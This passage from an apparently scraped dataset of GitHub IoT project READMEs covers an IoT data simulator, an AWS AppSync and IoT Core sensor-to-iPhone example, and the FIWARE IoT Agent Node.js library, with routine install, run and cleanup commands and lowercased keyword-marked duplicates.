definition step;\nselect timer options;\nskip \"select devices\" step.\non data processing step you can write any js function that returns any value. by default the following function is used:\nfunction process(state, datasetentry, devicename) {\nreturn {\ntimestamp: moment().valueof()\n}\n}\nselect or create dummy target system;\nenter session name and complete creation flow;\nrun session and explore payload in the session console;\nb) with schema\nskip dataset selection step on definition creation flow;\ncreate simple schema\nselect timer options (how often data will be generated by the tool)\nskip \"select devices\" step.\napply data processing rules via rules constructor;\ncreate or select dummy target system;\nenter session name and complete creation flow\nrun session and explore payload in the session console;\nintended usage and useful scenarios\nderive schema from dataset and use it without dataset (data generation mode)\nthis scenario is very useful when dataset has complex structure and you doesn't want to create schema for it from scratch. this can be achieved with the following steps:\ncreate definition with dataset and apply derived schema;\nupdate created definition and unselect dataset - derived schema won't be removed;\nstore state between data processing iterations. implement counter\nlet's say we would like to create simple counter with the following payload sent to a target system:\n{\n\"count\": 1 // number which increases on each iteration\n}\nin this case we could use data generatation mode (see usage section above). on the step #2 create schema with one integer property as shown on the screenshot below:\non step #5 select \"custom function\" rule for the \"count\" property. open editor and apply the following js function:\nfunction custom(rulestate, sessionstate, devicename) {\nif(typeof rulestate.counter === 'undefined') {\nrulestate.counter = 0;\n}\nrulestate.counter++\nreturn rulestate.counter;\n}\nsend data to different kafka topics:\nto send data to different kafka topics we should create several devices which will override target system properties with their \"topic data\". lets generate data for our example. go to create session screen, then:\ncreate data definition without dataset and with simple schema;\nselect timer options\ngo to \"create device\" screen, enter device name and press \"proceed\".\nyou should see target system screen that is specific for this device. go to create target system screen;\nenter target system name and select \"kafka\" type.\npopulate only topic field with \"kafka\" topic corresponding to this device. when creating device specific target system, only populated fields will override session target system properties.\nrepeat steps 3 - 6 for all kafka topics\nselect all devices on select devices step of session creation flow and press \"proceed\";\nselect device injection rule. please, read more about device injection rules in project gitbook;\napply processing rules.\ncreate or select kafka target system (topic should be filled, but anyway it will be overwritten by devices specific target systems topic parameter;\nenter session name and complete session creation flow;\nrun created session and observe session console;\ngenerate dataset and save it to local minio object storage\nto generate data and save it as file on local minio object storage create local storage target system while creating session. populate dataset field with desired file name.\ninject device property to processing rules\ngo to create session screen, then:\nselect data definition with schema\nselect timer options\ncreate one or more devices with populated properties fields\nselect created devices\nselect device injection rule\non processing rules step select device property rule for specific property that you would like to overwrite with device property;\ncomplete session creation flow\nsupported target systems\niot-data-simulator can send payload to the following target systems (with available security types in parentheses):\namqp (credentials and certificates)\nkafka (certificates)\nlocal object storage (minio object storage)\nmqtt (access keys, access token, credentials, certificates)\nrest (credentials, certificates)\nwebsocket (credentials, certificates)\nfaq\nq: i've updated session but it still uses old parameters a: session parameters are updated only when session is stopped. if session was paused, it will still use the previous parameters;\nq: what iot platforms do you support? a: in our company we used iot data simulator tool for working with thingsboard, aws and predix platforms. but it doesn't mean that it cannot be used with others.\nmotivation\nan iot data simulator is a required tool in any iot project. while using real world sensors and devices is required for final integration testing to make sure the system works end to end without any surprises, it is very impractical to use the real devices during development and initial testing phases where tests tend to be quicker, shorter, failing quicker and more often.\ndata simulator solves several problems at once:\nit is not necessary to run the physical equipment just to perform a unit or early integration test.\nyou can use synthetic generated data if you do not yet have access to the physical devices, or you can replay captured data to get it as real as possible.\nby imploding the data with some randomization, you can simulate a large number of devices that you may not be able to get hold of during the test and development.\nyou can replay data at various frequencies to run the test quicker (e.g. when the real world data is pushed every 5 minutes and it takes several days to trigger an alert).\nyou can simulate data from different stages of the system, so that the testing of the later stages does not have to wait until all the previous stages are completed to transform raw data into a suitable input. for example, you can simulate raw device data to develop and test initial processing, simulate \u201ccleaned up\u201d data stream to develop and test analytic components, and simulate analytic component results to develop and test visualization and ux.\nwritten with stackedit.\ncontributing\nthanks for your interest in contributing!\nget started here link.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000753, "year": null}, {"Unnamed: 0": 755, "autor": 755, "date": null, "content": "aws-appsync-iot-core-realtime-example\nThis application demonstrates an iPhone receiving real-time updates from an IoT sensor. The solution is built with AWS AppSync and AWS IoT Core technologies.\nArchitecture\nThe sensor component is developed with the AWS IoT Device SDK for Javascript. The sensor is registered as a Thing in IoT Core and publishes a random temperature in a JSON payload to the Cloud every 2 seconds. The Thing Shadow also containes meta-data about then sensor specifying the sensor type as Temperature.\n{\n\"value\": 84,\n\"timestamp\": 1570562147790\n}\nA rule in IoT Core subscribes to the message topic and forwards the JSON payload to a Lambda function.\nThe Node js Lambda function executes a GraphQL mutatation in AppSync. The mutation saves the latest value for the sensor in DynamoDB and broadcasts the latest value in real-time to the iOS application. The Lambda function uses an IAM role and policy to obtain permissions to interact with AppSync.\nThe React Native iOS application subscribes to the AppSync Sensor Update subscription. When new temperature values are received, the gauge component on the screen is updated in real-time to reflect the new sensor value. The iOS application uses Cognito to authenticate users and allow them to perform the AppSync subscription.\nGetting Started\nPrerequisites\nA Mac with\nXcode (^10.2)\nXcode iPhone Simulator enabled. (Simulators can be installed from the \"Components\" tab in Xcode Preferences)\nXcode Command-line Tools\nCocoaPods\nAn AWS account in which you have Administrator access.\nNode.js (^10.0) with NPM (^6.14)\nAmplify CLI (^4.21.0).\nAfter you have installed and configured Amplify, take note of the AWS profile you selected during the configuration. If you created a profile other than default, you will need the profile name for later steps in the deployment.\nInstalling\nIf you run into issues installing or configuring anything in this project please checkout the Troubleshooting section below.\nClone this code repository\n$ git clone https://github.com/aws-samples/aws-appsync-iot-core-realtime-example.git\nSwitch to the mobile folder\n$ cd aws-appsync-iot-core-realtime-example/mobile\nInstall the iOS app's Node.js and CocoaPod packages\n$ npm install\n$ cd ios\n$ pod install\n$ cd ..\nInitialize your Amplify environment\n$ cd aws-appsync-iot-core-realtime-example/mobile\n$ amplify init\n? Enter a name for the environment: mysandbox\n? Choose your default editor: [select your favorite IDE]\n? Do you want to use an AWS profile? Yes\n? Please choose the profile you want to use: default\nWhen you select your profile, make sure to select the same profile you used when configuring Amplify.\nAmplify will then begin to provision your account for the project deployment.\n? Do you want to configure Lambda Triggers for Cognito? (Y/n) n\nOnce your account has been provisioned, entering the 'amplify status' command will show you the resources Amplify will create in your account:\n$ amplify status\nCurrent Environment: mysandbox\n| Category | Resource name | Operation | Provider plugin |\n| -------- | ------------------ | --------- | ----------------- |\n| Auth | sensorview74d21f87 | Create | awscloudformation |\n| Api | sensorview | Create | awscloudformation |\n| Function | getsensor | Create | awscloudformation |\n| Function | createsensorvalue | Create | awscloudformation |\n| Iotrule | createsensorvalue | Create | awscloudformation |\nDeploy the app infrastructure to your AWS account\n$ amplify push\n? Do you want to update code for your updated GraphQL API (Y/n) Y\n? Do you want to generate GraphQL statements (queries, mutations and subscription) based on your schema types? This will overwrite your current graphql queries, mutations and subscriptions (Y/n) Y\nYou will then see a series of output as Amplify builds and deploys the app's CloudFormation Templates, creating the app infrastucture in your AWS account.\nResources being created in your account include:\nAppSync GraphQL API\nDynamoDB table\nCognito user pool\nLambda functions (2)\nIoT Rule\nInstall the IoT Sensor\nOpen a new terminal window then switch to the app's sensor folder (aws-appsync-iot-core-realtime-example/sensor).\nInstall the Node.js packages, and run the Node.js app to create your sensor as a Thing in AWS IoT Core. It will also create and install the certificates your sensor needs to authenticate to IoT Core.\nFrom the sensor folder:\n$ npm install\n$ node create-sensor.js\n*Note - this will create the sensor using your default AWS profile account and region. If you have not specified a default region in your local AWS configuration, it will default to us-east-1.\nIf you do not have a default profile or you are using a profile other than default, run the app with an AWS_PROFILE environment variable specifiying the profile name you would like to use.\nReplace [my-aws-profile] with the name of your profile:\n$ AWS_PROFILE=[my-aws-profile] node create-sensor.js\nRun the App\nStart the IoT Sensor\nFrom the sensor terminal window:\n$ node index.js\nYou will see output from the app as it connects to IoT Core, transmits its shadow document, and publishes new temperature messages every 2 seconds.\nconnected to IoT Hub\npublished to shadow topic $aws/things/sensor-1592073852935/shadow/update {\"state\":{\"reported\":{\"sensorType\":\"Temperature\"}}}\npublished to topic dt/sensor-view/sensor-1592073852935/sensor-value {\"value\":77,\"timestamp\":1592073890804}\npublished to topic dt/sensor-view/sensor-1592073852935/sensor-value {\"value\":76,\"timestamp\":1592073892807}\npublished to topic dt/sensor-view/sensor-1592073852935/sensor-value {\"value\":77,\"timestamp\":1592073894810}\nKeep this app running and switch to your mobile terminal window.\nStart the iPhone app\nSwitch back to the terminal window pointing to the mobile folder and run:\n$ npx react-native run-ios\nThis will launch Xcode's iPhone simulator and a new terminal window that serves up the app.\nThe default simulator is \"iPhone X\". If you wish to run your app on another iPhone version, for example an iPhone 11 Pro Max, run:\n$ npx react-native run-ios --simulator=\"iPhone 11 Pro Max\"\nThe simulator name must correspond to a device available in Xcode. You can check your available devices by running the following command from the console.\n$ xcrun simctl list devices\nSign-up and Sign-in\nThe iOS app requires users to authenticate via Cognito. The first screen you will see is a logon screen. Tap the Sign Up link and then tap the link to Create account and create a new account using your email address.\nCognito will then email you a confirmation code. Enter this code into the subsequent confirmation screen and logon to the app with your credentials.\nUse the App!\nYou should now see a screen similar to the one at the top of this guide. If you look at the terminal window running the sensor app, you shoud see the values being published to the Cloud reflected in the iPhone app's sensor gauge in real-time.\nCleanup\nOnce you are finished working with this project, you may want to delete the resources it created in your AWS account.\nFrom the mobile folder:\n$ amplify delete\n? Are you sure you want to continue? (This would delete all the environments of the project from the cloud and wipe out all the local amplify resource files) (Y/n) Y\nFrom the sensor folder:\n$ node delete-sensor.js\nTroubleshooting\nInstalling Amplify\n$ npm install -g @aws-amplify/cli\nIf you receive EACCES permisisons errors, make sure your system is setup properly to install global packages. See this Guide for options.\nStarting the iPhone App in the Simulator\n$ npx react-native run-ios\nWhen the iPhone simulator first starts you may see a red error screen related to the URL. This can occur if the simulator starts before the app in the terminal window finishes loading. If you see this:\nwait a few seconds\nclick on the simulator\nhit the cmd-R key combination\nThis will cause the simulator to reload the app.\nInstalling Pods or the Xcode Build\nIf pod install or npx react-native run-ios give you errors outside of the simulator try ensuring Xcode Developer tools are installed via\n$ xcode-select --install\nMake sure CocoaPods are installed\n$ sudo gem install cocoapods\nIf you get an error like \"xcrun: error: unable to find utility \u201csimctl\u201d, not a developer tool or in PATH\", ensure Xcode tools are pointing to your Xcode Application via\n$ sudo xcode-select -s /Applications/Xcode.app\nLicense\nThis sample code is made available under a modified MIT-0 license. See the LICENSE file.", "link": "https://github.com/aws-samples/aws-appsync-iot-core-realtime-example", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "aws-appsync-iot-core-realtime-example\nthis application demonstrates an iphone receiving real-time updates from an iot sensor. the solution is built with aws appsync and aws iot core technologies.\narchitecture\nthe sensor component is developed with the aws iot device sdk for javascript. the sensor is registered as a thing in iot core and publishes a random temperature in a json payload to the cloud every 2 seconds. the thing shadow also containes meta-data about then sensor specifying the sensor type as temperature.\n{\n\"value\": 84,\n\"timestamp\": 1570562147790\n}\na rule in iot core subscribes to the message topic and forwards the json payload to a lambda function.\nthe node js lambda function executes a graphql mutatation in appsync. the mutation saves the latest value for the sensor in dynamodb and broadcasts the latest value in real-time to the ios application. the lambda function uses an iam role and policy to obtain permissions to interact with appsync.\nthe react native ios application subscribes to the appsync sensor update subscription. when new temperature values are received, the gauge component on the screen is updated in real-time to reflect the new sensor value. the ios application uses cognito to authenticate users and allow them to perform the appsync subscription.\ngetting started\nprerequisites\na mac with\nxcode (^10.2)\nxcode iphone simulator enabled. (simulators can be installed from the \"components\" tab in xcode preferences)\nxcode command-line tools\ncocoapods\nan aws account in which you have administrator access.\nnode.js (^10.0) with npm (^6.14)\namplify cli (^4.21.0).\nafter you have installed and configured amplify, take note of the aws profile you selected during the configuration. if you created a profile other than default, you will need the profile name for later steps in the deployment.\ninstalling\nif you run into issues installing or configuring anything in this project please checkout the troubleshooting section below.\nclone this code repository\n$ git clone https://github.com/aws-samples/aws-appsync-iot-core-realtime-example.git\nswitch to the mobile folder\n$ cd aws-appsync-iot-core-realtime-example/mobile\ninstall the ios app's node.js and cocoapod packages\n$ npm install\n$ cd ios\n$ pod install\n$ cd ..\ninitialize your amplify environment\n$ cd aws-appsync-iot-core-realtime-example/mobile\n$ amplify init\n? enter a name for the environment: mysandbox\n? choose your default editor: [select your favorite ide]\n? do you want to use an aws profile? yes\n? please choose the profile you want to use: default\nwhen you select your profile, make sure to select the same profile you used when configuring amplify.\namplify will then begin to provision your account for the project deployment.\n? do you want to configure lambda triggers for cognito? (y/n) n\nonce your account has been provisioned, entering the 'amplify status' command will show you the resources amplify will create in your account:\n$ amplify status\ncurrent environment: mysandbox\n| category | resource name | operation | provider plugin |\n| -------- | ------------------ | --------- | ----------------- |\n| auth | sensorview74d21f87 | create | awscloudformation |\n| api | sensorview | create | awscloudformation |\n| function | getsensor | create | awscloudformation |\n| function | createsensorvalue | create | awscloudformation |\n| iotrule | createsensorvalue | create | awscloudformation |\ndeploy the app infrastructure to your aws account\n$ amplify push\n? do you want to update code for your updated graphql api (y/n) y\n? do you want to generate graphql statements (queries, mutations and subscription) based on your schema types? this will overwrite your current graphql queries, mutations and subscriptions (y/n) y\nyou will then see a series of output as amplify builds and deploys the app's cloudformation templates, creating the app infrastucture in your aws account.\nresources being created in your account include:\nappsync graphql api\ndynamodb table\ncognito user pool\nlambda functions (2)\niot rule\ninstall the iot sensor\nopen a new terminal window then switch to the app's sensor folder (aws-appsync-iot-core-realtime-example/sensor).\ninstall the node.js packages, and run the node.js app to create your sensor as a thing in aws iot core. it will also create and install the certificates your sensor needs to authenticate to iot core.\nfrom the sensor folder:\n$ npm install\n$ node create-sensor.js\n*note - this will create the sensor using your default aws profile account and region. if you have not specified a default region in your local aws configuration, it will default to us-east-1.\nif you do not have a default profile or you are using a profile other than default, run the app with an aws_profile environment variable specifiying the profile name you would like to use.\nreplace [my-aws-profile] with the name of your profile:\n$ aws_profile=[my-aws-profile] node create-sensor.js\nrun the app\nstart the iot sensor\nfrom the sensor terminal window:\n$ node index.js\nyou will see output from the app as it connects to iot core, transmits its shadow document, and publishes new temperature messages every 2 seconds.\nconnected to iot hub\npublished to shadow topic $aws/things/sensor-1592073852935/shadow/update {\"state\":{\"reported\":{\"sensortype\":\"temperature\"}}}\npublished to topic dt/sensor-view/sensor-1592073852935/sensor-value {\"value\":77,\"timestamp\":1592073890804}\npublished to topic dt/sensor-view/sensor-1592073852935/sensor-value {\"value\":76,\"timestamp\":1592073892807}\npublished to topic dt/sensor-view/sensor-1592073852935/sensor-value {\"value\":77,\"timestamp\":1592073894810}\nkeep this app running and switch to your mobile terminal window.\nstart the iphone app\nswitch back to the terminal window pointing to the mobile folder and run:\n$ npx react-native run-ios\nthis will launch xcode's iphone simulator and a new terminal window that serves up the app.\nthe default simulator is \"iphone x\". if you wish to run your app on another iphone version, for example an iphone 11 pro max, run:\n$ npx react-native run-ios --simulator=\"iphone 11 pro max\"\nthe simulator name must correspond to a device available in xcode. you can check your available devices by running the following command from the console.\n$ xcrun simctl list devices\nsign-up and sign-in\nthe ios app requires users to authenticate via cognito. the first screen you will see is a logon screen. tap the sign up link and then tap the link to create account and create a new account using your email address.\ncognito will then email you a confirmation code. enter this code into the subsequent confirmation screen and logon to the app with your credentials.\nuse the app!\nyou should now see a screen similar to the one at the top of this guide. if you look at the terminal window running the sensor app, you shoud see the values being published to the cloud reflected in the iphone app's sensor gauge in real-time.\ncleanup\nonce you are finished working with this project, you may want to delete the resources it created in your aws account.\nfrom the mobile folder:\n$ amplify delete\n? are you sure you want to continue? (this would delete all the environments of the project from the cloud and wipe out all the local amplify resource files) (y/n) y\nfrom the sensor folder:\n$ node delete-sensor.js\ntroubleshooting\ninstalling amplify\n$ npm install -g @aws-amplify/cli\nif you receive eacces permisisons errors, make sure your system is setup properly to install global packages. see this guide for options.\nstarting the iphone app in the simulator\n$ npx react-native run-ios\nwhen the iphone simulator first starts you may see a red error screen related to the url. this can occur if the simulator starts before the app in the terminal window finishes loading. if you see this:\nwait a few seconds\nclick on the simulator\nhit the cmd-r key combination\nthis will cause the simulator to reload the app.\ninstalling pods or the xcode build\nif pod install or npx react-native run-ios give you errors outside of the simulator try ensuring xcode developer tools are installed via\n$ xcode-select --install\nmake sure cocoapods are installed\n$ sudo gem install cocoapods\nif you get an error like \"xcrun: error: unable to find utility \u201csimctl\u201d, not a developer -----> tool !!!  or in path\", ensure xcode tools are pointing to your xcode application via\n$ sudo xcode-select -s /applications/xcode.app\nlicense\nthis sample code is made available under a modified mit-0 license. see the license file.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000755, "year": null}, {"Unnamed: 0": 759, "autor": 759, "date": null, "content": "FIWARE IoT Agent Node.js Library\nThis project aims to provide a Node.js module to enable IoT Agent developers to build custom agents for their devices that can easily connect to NGSI Context Brokers (such as Orion).\nAn IoT Agent is a component that lets groups of devices send their data to and be managed from a FIWARE NGSI Context Broker using their own native protocols. IoT Agents should also be able to deal with security aspects of the FIWARE platform (authentication and authorization of the channel) and provide other common services to the device programmer.\nThis project is part of FIWARE. For more information check the FIWARE Catalogue entry for the IoT Agents.\n\ud83d\udcda Documentation \ud83c\udf93 Academy \ud83c\udfaf Roadmap\nIndex\nBackground\nInstall\nAPI\nUsage\nTesting\nAgent Console\nAgent tester\nLicence\nBackground\nThe main concept of the IoT Agent node library is to provide a common framework for provisioning IoT devices, allowing each individual IoT Agent to access standardized mapping data for devices and to offer a series common utility functions.\nFor southbound communications, the library listens to changes in context entities and raises callbacks for the IoT Agent to process.\nFor northbound communications, the library offers an interface which accepts structured input data so that all NGSI communications are left to the library.\nStandardized OAuth2-based security is available to enable each IoT Agent to connect to several common Identity Managers (e.g. Keystone and Keyrock) so that communications can be restricted to trusted components.\nA series of additional plugins are offered where necessary to allow for expression parsing, attribute aliasing and the processing of timestamp metadata.\nEach individual IoT Agent offers is driven by a config.js configuration file contains explicit custom settings based on the protocol and payload the IoT Agent is translating. It will also contain some common flags for common functionality provided by the IoT Agent node lin (e.g. for contecting to a conext broker or for authentication). The IoT Agent node library offers a standard API for provisioning devices and ensures that each IoT Agent can configure its device communications using a common vocabulary regardless of the payload, syntax or transport protocol used by the device itself.\nInstall\nThe IoT Agent node library is not a standalone product and should be added as a dependency to package.json of the IoT Agent\n...\n\"dependencies\": {\n\"iotagent-node-lib\": \"*\",\n}\nIn order to use the library within your own IoT Agent, you must first you require it before use:\nconst iotagentLib = require(\"iotagent-node-lib\");\nInformation about how to configure the Library can be found at the corresponding section of the Installation & Administration Guide.\nUsage\nThis library has no packaging or build processes. The Getting Started is a good place to start. Usage of the library is explained in the User & Programmers Manual.\nDetails of the architecture of an IoT Agent be found here.\nFurther Advanced topics can be found here.\nThe following features are listed as deprecated.\nAPI\nThe IoT Agent node library offers a simple REST API which provides common functionality to access, provision and decommission devices. API.\nTesting\nContributions to development can be found here - additional contributions are welcome.\nAgent Console\nA command-line client to experiment with the library is packed with it. The command-line client can be started using the following command:\nbin/agentConsole.js\nThe client offers an API similar to the one offered by the library: it can start and stop an IoT agent, register and unregister devices, send measures mimicking the device and receive updates of the device data. Take into account that, by default, the console uses the same config.js file than the IoT Agent.\nThe command-line client creates a console that offers the following options:\nstressInit\nStart recording a stress batch.\nstressCommit <delay> <times> <threads> <initTime>\nExecutes the recorded batch as many times as requested, with delay (ms) between commands.\nThe \"threads\" parameter indicates how many agents will repeat that same sequence. The \"initTime\" (ms)\nparameter indicates the mean of the random initial waiting times for each agent.\nexit\nExit from the command-line.\nstart\nStart the IoT Agent\nstop\nStop the IoT Agent\nregister <id> <type>\nRegister a new device in the IoT Agent. The attributes to register will be extracted from the\ntype configuration\nunregister <id> <type>\nUnregister the selected device\nshowConfig\nShow the current configuration file\nconfig <newConfig>\nChange the configuration file to a new one\nupdatevalue <deviceId> <deviceType> <attributes>\nUpdate a device value in the Context Broker. The attributes should be triads with the following\nformat: \"name/type/value\" sepparated by commas.\nlistdevices\nList all the devices that have been registered in this IoT Agent session\nAgent tester\nCommand-line testing\nThe library also offers a Context Broker and IoT Agent client that can be used to:\nSimulate operations to the Context Broker used by the IoT Agent, triggering Context Provider forwardings for lazy attributes and checking the appropriate values for active ones.\nSimulate operations to the Device Provisioning API and Configuration API of the IoT Agent.\nThe tester can be started with the following command, from the root folder of the project:\nbin/iotAgentTester.js\nFrom the command-line, the help command can be used to show a description of the currently supported features. These are the following:\nstressInit\nStart recording a stress batch.\nstressCommit <delay> <times> <threads> <initTime>\nExecutes the recorded batch as many times as requested, with delay (ms) between commands.\nThe \"threads\" parameter indicates how many agents will repeat that same sequence. The \"initTime\" (ms)\nparameter indicates the mean of the random initial waiting times for each agent.\nexit\nExit from the command-line.\nupdate <entity> <type> <attributes>\nUpdate the values of the defined set of attributes, using the following format: name#type=value(|name#type=value)*\nappend <entity> <type> <attributes>\nAppend a new Entity with the defined set of attributes, using the following format: name:type=value(,name:type=value)*\nquery <entity> <type>\nGet all the information on the selected object.\nqueryAttr <entity> <type> <attributes>\nGet information on the selected object for the selected attributes.\ndiscover <entity> <type>\nGet all the context providers for a entity and type.\nconfigCb <host> <port> <service> <subservice>\nConfig a new host and port for the remote Context Broker.\nshowConfigCb\nShow the current configuration of the client for the Context Broker.\nconfigIot <host> <port> <service> <subservice>\nConfig a new host and port for the remote IoT Agent.\nshowConfigIot\nShow the current configuration of the client for the IoT Agent.\nprovision <filename>\nProvision a new device using the Device Provisioning API. The device configuration is\nread from the file specified in the \"filename\" parameter.\nprovisionGroup <template> <data> <type>\nProvision a group of devices with the selected template, taking the information needed to\nfill the template from a CSV with two columns, DEVICE_ID and DEVICE_NAME. The third parameter, type\nwill be used to replace the DEVICE_TYPE field in the template. All the devices will be provisioned\nto the same IoT Agent, once the templates have been fulfilled.\nlistProvisioned\nList all the provisioned devices in an IoT Agent.\nremoveProvisioned <deviceId>\nRemove the selected provisioned device from the IoT Agent, specified by its Device ID.\naddGroup <filename>\nAdd a new device group to the specified IoT Agent through the Configuration API. The\nbody is taken from the file specified in the \"filename\" parameter.\nlistGroups\nList all the device groups created in the selected IoT Agent for the configured service\nremoveGroup <apiKey> <resource>\nRemove the device group corresponding to the current configured subservice.\nauthenticate <host> <port> <user> <password> <service>\nAuthenticates to the given authentication server, and use the token in subsequent requests.\nsetProtocol <protocol>\nSets the protocol to use in the requests (http or https). Defaults to http.\nconfigMigration <host> <port> <originDb>\nSets the configuration for a migration between a C++ IoTA and a Node.js one.\nshowConfigMigration\nShows the current migration configuration.\naddProtocols <protocols>\nAdd a protocol translation table, in the following format:\nprotocolOrigin1=protocolTarget1;protocolOrigin2=protocolTarget2...\nmigrate <targetDb> <service> <subservice>\nMigrate all the devices and services for the selected service and subservice into the\nspecified Mongo database. To perform the migration for all the services or all the\nsubservices, use the \"*\" value.\nThe agent session stores transient configuration data about the target Context Broker and the target IoT Agent. This configuration is independent, and can be checked with the showConfigCb and showConfigIot commands, respectively. Their values can be changed with the configCb and configIot commands respectively. The new configurations will be deleted upon startup.\nCreating specialized testers\nThe command-line testing tools make use of the command-node Node.js library for command-line utils. In order to help creating testing tools for IoTAgents of specific protocols, all the commands of the library tester are offered as a array that can be directly imported into other Command-Line tools, using the following steps:\nRequire the iotagent-node-lib command-line module in your command-line tool:\nvar iotaCommands = require(\"iotagent-node-lib\").commandLine;\nInitialize the command-line utils (the initialization function takes two arguments, that will be explained in detail below:\niotaCommands.init(configCb, configIot);\nAdd the IOTA Lib commands to your array of commands\ncommands = commands.concat(commands, iotaCommands.commands);\nExecute the command-line interpreter as usual:\nclUtils.initialize(commandLine.commands, \"IoT Agent tester> \");\nThe command-line module makes use of two configuration objects. Both can be shown and edited in the command-line using the provided commands, but a default value must be present.\nThe Context Broker configuration object holds all the information about the Context Broker where the IoT Agent to be tested is connected. It MUST contain the following attributes:\nhost: host where the Context Broker instance is located.\nport: port where the Context Broker instance is listening.\nservice: service that will be used in all the NGSI operations.\nsubservice: service that will be used in all the NGSI operations.\nThe IoT Agent configuration object holds information about the IoT Agent that is being tested. It MUST contain the following attributes:\nhost: host where the IoT Agent instance is located.\nport: port where the IoT Agent instance is listening.\nservice: service that will be used to group devices and device information.\nsubservice: subservice that will be used to group devices and device information.\nLicence\nThe IoT Agent Node Library is licensed under Affero General Public License (GPL) version 3.\n\u00a9 2019 Telefonica Investigaci\u00f3n y Desarrollo, S.A.U\nAre there any legal issues with AGPL 3.0? Is it safe for me to use?\nThere is absolutely no problem in using a product licensed under AGPL 3.0. Issues with GPL (or AGPL) licenses are mostly related with the fact that different people assign different interpretations on the meaning of the term \u201cderivate work\u201d used in these licenses. Due to this, some people believe that there is a risk in just using software under GPL or AGPL licenses (even without modifying it).\nFor the avoidance of doubt, the owners of this software licensed under an AGPL-3.0 license wish to make a clarifying public statement as follows:\nPlease note that software derived as a result of modifying the source code of this software in order to fix a bug or incorporate enhancements is considered a derivative work of the product. Software that merely uses or aggregates (i.e. links to) an otherwise unmodified version of existing software is not considered a derivative work, and therefore it does not need to be released as under the same license, or even released as open source.", "link": "https://github.com/telefonicaid/iotagent-node-lib", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "fiware iot agent node.js library\nthis project aims to provide a node.js module to enable iot agent developers to build custom agents for their devices that can easily connect to ngsi context brokers (such as orion).\nan iot agent is a component that lets groups of devices send their data to and be managed from a fiware ngsi context broker using their own native protocols. iot agents should also be able to deal with security aspects of the fiware platform (authentication and authorization of the channel) and provide other common services to the device programmer.\nthis project is part of fiware. for more information check the fiware catalogue entry for the iot agents.\n\ud83d\udcda documentation \ud83c\udf93 academy \ud83c\udfaf roadmap\nindex\nbackground\ninstall\napi\nusage\ntesting\nagent console\nagent tester\nlicence\nbackground\nthe main concept of the iot agent node library is to provide a common framework for provisioning iot devices, allowing each individual iot agent to access standardized mapping data for devices and to offer a series common utility functions.\nfor southbound communications, the library listens to changes in context entities and raises callbacks for the iot agent to process.\nfor northbound communications, the library offers an interface which accepts structured input data so that all ngsi communications are left to the library.\nstandardized oauth2-based security is available to enable each iot agent to connect to several common identity managers (e.g. keystone and keyrock) so that communications can be restricted to trusted components.\na series of additional plugins are offered where necessary to allow for expression parsing, attribute aliasing and the processing of timestamp metadata.\neach individual iot agent offers is driven by a config.js configuration file contains explicit custom settings based on the protocol and payload the iot agent is translating. it will also contain some common flags for common functionality provided by the iot agent node lin (e.g. for contecting to a conext broker or for authentication). the iot agent node library offers a standard api for provisioning devices and ensures that each iot agent can configure its device communications using a common vocabulary regardless of the payload, syntax or transport protocol used by the device itself.\ninstall\nthe iot agent node library is not a standalone product and should be added as a dependency to package.json of the iot agent\n...\n\"dependencies\": {\n\"iotagent-node-lib\": \"*\",\n}\nin order to use the library within your own iot agent, you must first you require it before use:\nconst iotagentlib = require(\"iotagent-node-lib\");\ninformation about how to configure the library can be found at the corresponding section of the installation & administration guide.\nusage\nthis library has no packaging or build processes. the getting started is a good place to start. usage of the library is explained in the user & programmers manual.\ndetails of the architecture of an iot agent be found here.\nfurther advanced topics can be found here.\nthe following features are listed as deprecated.\napi\nthe iot agent node library offers a simple rest api which provides common functionality to access, provision and decommission devices. api.\ntesting\ncontributions to development can be found here - additional contributions are welcome.\nagent console\na command-line client to experiment with the library is packed with it. the command-line client can be started using the following command:\nbin/agentconsole.js\nthe client offers an api similar to the one offered by the library: it can start and stop an iot agent, register and unregister devices, send measures mimicking the device and receive updates of the device data. take into account that, by default, the console uses the same config.js file than the iot agent.\nthe command-line client creates a console that offers the following options:\nstressinit\nstart recording a stress batch.\nstresscommit <delay> <times> <threads> <inittime>\nexecutes the recorded batch as many times as requested, with delay (ms) between commands.\nthe \"threads\" parameter indicates how many agents will repeat that same sequence. the \"inittime\" (ms)\nparameter indicates the mean of the random initial waiting times for each agent.\nexit\nexit from the command-line.\nstart\nstart the iot agent\nstop\nstop the iot agent\nregister <id> <type>\nregister a new device in the iot agent. the attributes to register will be extracted from the\ntype configuration\nunregister <id> <type>\nunregister the selected device\nshowconfig\nshow the current configuration file\nconfig <newconfig>\nchange the configuration file to a new one\nupdatevalue <deviceid> <devicetype> <attributes>\nupdate a device value in the context broker. the attributes should be triads with the following\nformat: \"name/type/value\" sepparated by commas.\nlistdevices\nlist all the devices that have been registered in this iot agent session\nagent tester\ncommand-line testing\nthe library also offers a context broker and iot agent client that can be used to:\nsimulate operations to the context broker used by the iot agent, triggering context provider forwardings for lazy attributes and checking the appropriate values for active ones.\nsimulate operations to the device provisioning api and configuration api of the iot agent.\nthe tester can be started with the following command, from the root folder of the project:\nbin/iotagenttester.js\nfrom the command-line, the help command can be used to show a description of the currently supported features. these are the following:\nstressinit\nstart recording a stress batch.\nstresscommit <delay> <times> <threads> <inittime>\nexecutes the recorded batch as many times as requested, with delay (ms) between commands.\nthe \"threads\" parameter indicates how many agents will repeat that same sequence. the \"inittime\" (ms)\nparameter indicates the mean of the random initial waiting times for each agent.\nexit\nexit from the command-line.\nupdate <entity> <type> <attributes>\nupdate the values of the defined set of attributes, using the following format: name#type=value(|name#type=value)*\nappend <entity> <type> <attributes>\nappend a new entity with the defined set of attributes, using the following format: name:type=value(,name:type=value)*\nquery <entity> <type>\nget all the information on the selected object.\nqueryattr <entity> <type> <attributes>\nget information on the selected object for the selected attributes.\ndiscover <entity> <type>\nget all the context providers for a entity and type.\nconfigcb <host> <port> <service> <subservice>\nconfig a new host and port for the remote context broker.\nshowconfigcb\nshow the current configuration of the client for the context broker.\nconfigiot <host> <port> <service> <subservice>\nconfig a new host and port for the remote iot agent.\nshowconfigiot\nshow the current configuration of the client for the iot agent.\nprovision <filename>\nprovision a new device using the device provisioning api. the device configuration is\nread from the file specified in the \"filename\" parameter.\nprovisiongroup <template> <data> <type>\nprovision a group of devices with the selected template, taking the information 